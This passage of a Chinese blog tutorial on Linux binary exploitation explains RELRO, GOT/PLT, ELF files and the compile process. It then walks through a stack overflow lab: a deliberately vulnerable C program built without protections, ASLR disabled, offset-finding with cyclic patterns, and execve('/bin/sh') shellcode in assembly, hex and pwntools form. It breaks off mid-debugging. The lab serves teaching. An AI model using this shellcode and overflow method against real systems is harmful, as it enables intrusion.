</span><br></pre></td></tr></table></figure><p>可以看到全部地址都随机了</p><hr><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><p>gcc编译：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c            <span class="comment">#默认情况下，是Partial RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c <span class="comment">#关闭，即No RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c    <span class="comment">#部分开启，即Partial RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c     <span class="comment">#全部开启</span></span><br></pre></td></tr></table></figure><hr><blockquote><h3 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h3></blockquote><h4 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h4><p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。</p><hr><h4 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h4><p>PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p><h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p><hr><h4 id="GOT和PLT的关系"><a href="#GOT和PLT的关系" class="headerlink" title="GOT和PLT的关系"></a>GOT和PLT的关系</h4><p>ELF使用PLT（Procedure linkage Table, 过程链接表)的方法来实现。通常我们调用某个外部模块的函数时，应该是通过GOT中相应的项进行间接跳转。而PLT为了实现延迟绑定，在这个过程中有增加了一层间接跳转。调用函数并不直接通过GOT跳转，而是通过一个叫作PLT项的结构来进行跳转。每个外部函数在PLT中都有一个相应的项，比如<code>gets()</code>(<strong>在string头文件的函数，不是用户自定义的函数</strong>)在PLT中的项的地址我们称为<code>gets@plt</code>。其中<code>gets@plt</code>的实现如下：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/3.png" alt="image-20201116153715662"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在gets第一次使用的时候，会做以下操作，如果不是第一次就直接jmp *(gets@GOT)就能获取到函数的真实地址</span><br><span class="line">gets@plt:</span><br><span class="line">    jmp *(gets@GOT)</span><br><span class="line">    push n</span><br><span class="line">    jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><ul><li>第一条指令是通过一条GOT间接跳转的指令。jmp指令跳转到GOT表，数据为0x400486</li><li>第二条指令执行<code>push 0x3</code>，这个为在GOT中的下标序号。</li><li>第三条指令<code>jmp 0x400440</code>，这个地址为PLT[0]的地址，PLT[0]的指令会进入动态链接器的入口，执行一个函数(<strong>_dl_runtime_resolve</strong>)将真正的函数地址填入到GOT表中</li></ul><p>再次调用<code>gets@plt</code>时，第一条jump指令能跳转到真正的gets()函数中，gets()函数返回的时候会根据堆栈里保存的EIP直接返回到调用者，而不会在继续执行<code>gets@plt</code>中第二条指令开始的那段代码。因为GOT表中已经有真正的函数地址，逻辑和下图类似</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/4.png" alt="image-20201116161136273"></p><hr><blockquote><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3></blockquote><h4 id="可重定位目标文件-Relocatable-File）"><a href="#可重定位目标文件-Relocatable-File）" class="headerlink" title="可重定位目标文件 (Relocatable File）"></a>可重定位目标文件 (Relocatable File）</h4><p><strong>Linux</strong>下的.o（<strong>Windows</strong>下的.obj）包含代码和数据，可被用来链接成可执行文件或共享目标文件，静态链接库也可以归为这一类 </p><p>每个.o 文件由对应的.c文件生成 每个.o文件代码和数据地址都从0开始</p><hr><h4 id="可执行目标文件-Executable-File"><a href="#可执行目标文件-Executable-File" class="headerlink" title="可执行目标文件(Executable File)"></a>可执行目标文件(Executable File)</h4><p>包含的代码和数据可以被直接复制到内存并被执行</p><p><strong>Linux</strong>下的无文件后缀（<strong>Windows</strong>下的.exe）</p><hr><h4 id="共享的目标文件-Shared-Object-File"><a href="#共享的目标文件-Shared-Object-File" class="headerlink" title="共享的目标文件 (Shared Object File)"></a>共享的目标文件 (Shared Object File)</h4><p>链接器可使用.so文件跟其他.o文件和.so文件链接以生成新的.o文件</p><p>动态链接器将几个.so文件与可执行文件结合，作为进程映像的一部分来运行 特殊的可重定位目标文件，能在装入或运行时被装入到内存并自动被链接，称为共享库文件</p><p><strong>Windows</strong> 中称其为 <strong>Dynamic</strong> <strong>Link</strong> <strong>Libraries</strong> (<strong>DLLs</strong>)</p><hr><h4 id="常见的文件格式"><a href="#常见的文件格式" class="headerlink" title="常见的文件格式"></a>常见的文件格式</h4><ul><li><p>DOS操作系统（最简单） ：<strong>COM格式</strong>，文件中仅包含代码和数据，且被加载到固定位置</p></li><li><p>UNIX System V早期版本：<strong>COFF格式</strong>，文件中不仅包含代码和数据，还包含重定位信息、调试信息、符号表等其他信息，由一组严格定义的数据结构序列组成</p></li><li><p>Windows： <strong>PE格式（COFF的变种）</strong>，称为可移植可执行（Portable Executable，简称PE）</p><p>详解请看这篇文章<a href="https://www.ascotbe.com/2020/03/23/PortableExecutable/">PE格式详解</a></p></li><li><p>Linux：<strong>ELF格式（COFF的变种）</strong>，称为可执行可链接（Executable and Linkable Format，简称ELF）</p><p>详解请看这篇文章<a href="https://www.ascotbe.com/2020/12/6/ExecutableLinkableFormat/">ELF格式详解</a></p></li></ul><hr><blockquote><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3></blockquote><h4 id="ELF文件生成"><a href="#ELF文件生成" class="headerlink" title="ELF文件生成"></a>ELF文件生成</h4><p>首先来看一个代码文件生成过程，下面过程也可以直接从原始C文件链路到任意过程，一下步骤只是一个拆分过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="预处理过程"><a href="#预处理过程" class="headerlink" title="预处理过程"></a>预处理过程</h5><p>主要处理源文件中以“#”开头的预编译指令，经过预编译处理后，得到的是预处理文件（如，hello.i) ，它还是一个可读的文本文件 。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure><hr><h5 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h5><p>将预处理后得到的预处理文件（如 hello.i）进行词法分析、语法分析、语义分析、优化后，生成汇编代码文件。经过编译后，得到的汇编代码文件（如 hello.s）还是可读的文本文件，CPU无法理解和执行它。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/5.png" alt="image-20201116113805853"></p><hr><h5 id="汇编过程"><a href="#汇编过程" class="headerlink" title="汇编过程"></a>汇编过程</h5><p>汇编程序（汇编器）用来将汇编语言源程序转换为机器指令序列（机器语言程序）。汇编结果是一个可重定位目标文件（如 hello.o），其中包含的是不可读的二进制代码，必须用相应的工具软件来查看其内容。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>预处理、编译和汇编三个过程针对一个模块（一个*.c文件）进行处理，得到对应的一个可重定位目标文件（一个*.o文件）。</p><p>用IDA打开</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/6.png" alt="image-20201116114352893"></p><hr><h5 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h5><p>将多个可重定位目标文件合并以生成可执行目标文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  hello.o -o hello</span><br></pre></td></tr></table></figure><p>用IDA打开编译好可以执行的文件</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/7.png" alt="image-20201116114653378"></p><hr><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>拿到一个文件后首先第一步就是看保护，通过保护来查看使用什么思路</p><ul><li>RELRO： got表的保护，如果开了的话，无法写got表，没开考虑got表</li><li>Canary: 栈溢出保护，开了的话，想办法利用bypass canary绕过，没开直接ROP</li><li>NX: 开了的话，利用ROP技术绕过，没开的话，考虑执行shellcode</li><li>PIE： 开了的话就用bypass pie技术绕过， 没开的话，地址是固定的，考虑一下是否存在后门函数，查看是否有/bin/sh以及system函数</li></ul><hr><blockquote><h3 id="快速获取恶意汇编"><a href="#快速获取恶意汇编" class="headerlink" title="快速获取恶意汇编"></a>快速获取恶意汇编</h3></blockquote><p>使用Python中的pwntools包可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    nop</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br><span class="line">    <span class="comment"># push &#x27;/bin///sh\x00&#x27;</span></span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    push <span class="number">0x732f2f2f</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br></pre></td></tr></table></figure><p>果需要在64位的Linux上执行<code>/bin/sh</code>就可以使用<code>shellcraft.amd64.linux.sh()</code>，配合asm函数就能够得到最终的payload了。</p><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等</p><blockquote><h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3></blockquote><h4 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|   local var1     |  &lt;- 4 byte</span><br><span class="line">+------------------+</span><br><span class="line">|   local var2     |  &lt;- 8 byte</span><br><span class="line">+------------------+</span><br><span class="line">|        ebp       |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>这个函数有一个参数和两个局部变量。局部变量会放在函数的栈帧上，而且这个栈帧的大小是编译时就确定好的。可以看出局部变量1、局部变量2大小都是4字节，局部变量1在4字节的位置上，局部变量2在8字节上的位置上。ebp和return addr是用来保存栈帧基址和函数的返回地址的，对程序员透明。如果给局部变量2输入16个字节，那么就会吧return addr和ebp都给覆盖了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+                   溢出本质其实就是把ret地址换成</span><br><span class="line">|    parameter     |                 指向shellcode的开头的地址</span><br><span class="line">+------------------+</span><br><span class="line">|       abcd       |  &lt;- local var1</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- local var2</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- ebp</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- return addr</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><hr><h4 id="无保护溢出"><a href="#无保护溢出" class="headerlink" title="无保护溢出"></a>无保护溢出</h4><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><h5 id="编译代码"><a href="#编译代码" class="headerlink" title="编译代码"></a>编译代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译上述代码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -no-pie level1.c -o level1 </span><br></pre></td></tr></table></figure><p>接着查看程序保护是否关闭了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># checksec level1</span></span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/level1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>接着关闭Linux系统的ASLR保护</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#非docker容器关闭</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">sysctl -w kernel.randomize_va_space=0</span><br><span class="line"><span class="comment">#docker容器只能在GDB场景下关闭</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization on<span class="comment">#关闭ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization off <span class="comment">#开启ASLR</span></span><br><span class="line">show disable-randomization<span class="comment">#查看ASLR状态</span></span><br></pre></td></tr></table></figure><p>如果输入<code>cat /proc/sys/kernel/randomize_va_space</code>若返回为0的话表示已经关闭了</p><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 = 全随机。除了1中所述，还有heap。</li></ul><p>也可以使用ldd通过看加载动态库时动态库的基址来确定是否开启ASLR，如果开启是下面这样的，未开启是值不变的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7ed1000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cd5000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7ed2000)</span><br><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7f8f000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d93000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f90000)</span><br></pre></td></tr></table></figure><p>在没有任何保护的情况下，我们的利用思路只需要确定字符串大小、返回地址、还有shellcode，然后拼接起来即可，拼接的原理有两种方法</p><ul><li>方法1：把shellcode写在函数的栈帧里, 但其大小有限</li><li>方法2：把shellcode写在调用者(main)的栈帧里</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">方法1：                               方法2：</span><br><span class="line">     Stack                                   Stack</span><br><span class="line">+------------------+       低地址          +------------------+ </span><br><span class="line">|    shellcode     |         ^            | &quot;AAAAAAAAAAAAAA&quot; |</span><br><span class="line">+------------------+         |            +------------------+ </span><br><span class="line">| &quot;AAAAAAAAAAAAAA&quot; |         |            |       ret        |</span><br><span class="line">+------------------+         |            +------------------+ </span><br><span class="line">|        ret       |         |            |    shellcode     |</span><br><span class="line">+------------------+       高地址          +------------------+ </span><br></pre></td></tr></table></figure><hr><h5 id="找出溢出值"><a href="#找出溢出值" class="headerlink" title="找出溢出值"></a>找出溢出值</h5><p>首先开始确定程序溢出的字符串大小，我们先创建200个字符</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure><p>运行后程序奔溃，EIP被覆盖了，显示错误值为<code>0x6261616b(kkab)</code></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/8.png" alt="image-20201117143016927"></p><p>然后我们用cyclic就能看到溢出的字符串大小了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6261616b</span><br><span class="line">140</span><br></pre></td></tr></table></figure><hr><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>接着制作一个shellcode，直接使用汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; shellcode.asm</span><br><span class="line">; execve (&quot;&#x2F;bin&#x2F;sh&quot;) 汇编原形</span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax, eax</span><br><span class="line">push eax        ;&quot;\x00&quot;</span><br><span class="line">push 0x68732f2f ;&quot;&#x2F;&#x2F;sh&quot; 入栈</span><br><span class="line">push 0x6e69622f ;&quot;&#x2F;bin&quot; 入栈</span><br><span class="line">mov ebx, esp    ;ebx&#x3D;esp &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;的地址</span><br><span class="line">push eax        ;&quot;\x00&quot; 入栈</span><br><span class="line">push ebx        ;&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;地址入栈</span><br><span class="line">mov ecx, esp    ;ecx&#x3D;esp  为指针数组地址</span><br><span class="line">xor edx, edx    ;edx&#x3D;0</span><br><span class="line">mov al, 11      ;al&#x3D;11   execve的系统调用号</span><br><span class="line">int 0x80        ;软中断指令</span><br></pre></td></tr></table></figure><p>如果不确定汇编能不能用可以编译然后运行试试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf shellcode.asm</span><br><span class="line">ld -m elf_i386 -o shellcode shellcode.o <span class="comment">#编译的是32位的汇编</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/9.png" alt="image-20201117203411240"></p><p>接着我们要把汇编代码转换成SHELLCODE，有好几种方法，这边就提三种</p><ul><li><p>使用rasm2把汇编代码转换为C的shellcode，转换的时候只需要shellcode.asm文件<code>_start:</code>后面的内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># rasm2 -a x86 -b 32 -f shellcode.asm -C</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>使用pwntools进行转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shellcode.py</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">pwn.context.arch      = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">pwn.context.os        = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">pwn.context.endian    = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">pwn.context.word_size = <span class="number">32</span></span><br><span class="line">shellcode = pwn.asm(<span class="string">&quot;xor eax, eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x68732f2f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x6e69622f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ebx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push ebx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ecx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;xor edx, edx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov al, 11&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line">print(shellcode.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>运行Python脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># python3 shellcode.py</span></span><br><span class="line">31c050682f2f7368682f62696e89e3505389e131d2b00bcd80</span><br></pre></td></tr></table></figure></li><li><p>使用pwntools内置的汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">print(shellcode)</span><br></pre></td></tr></table></figure></li></ul><hr><h5 id="寻找返回地址"><a href="#寻找返回地址" class="headerlink" title="寻找返回地址"></a>寻找返回地址</h5><p>由于gdb的调试环境会影响<strong>buf</strong>在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行<code>./level1</code>的时候，<strong>buf</strong>的位置会固定在别的地址上。</p><p>所以需要开启core dump功能，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/core_uses_pid</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/corefiles/core-%e-%p-%t&#x27;</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></pre></td></tr></table></figure><p>接着进行调试</p><p><strong>注意：如果重启机器关闭的ASLR或者开启的core dump都会关闭了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ ./level1 </span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">kali@kali:~/Desktop/Pwn$ gdb ./level1 /tmp/core.1605753112.1826 </span><br><span class="line">Core was generated by `./level1<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">#0  0x41416d41 in ?? ()</span></span><br><span class="line"><span class="string">gdb-peda$ pattern offset 0x41416d41</span></span><br><span class="line"><span class="string">1094806849 found at offset: 140</span></span><br><span class="line"><span class="string">gdb-peda$ x/10s $esp-144</span></span><br><span class="line"><span class="string">0xffffd190:     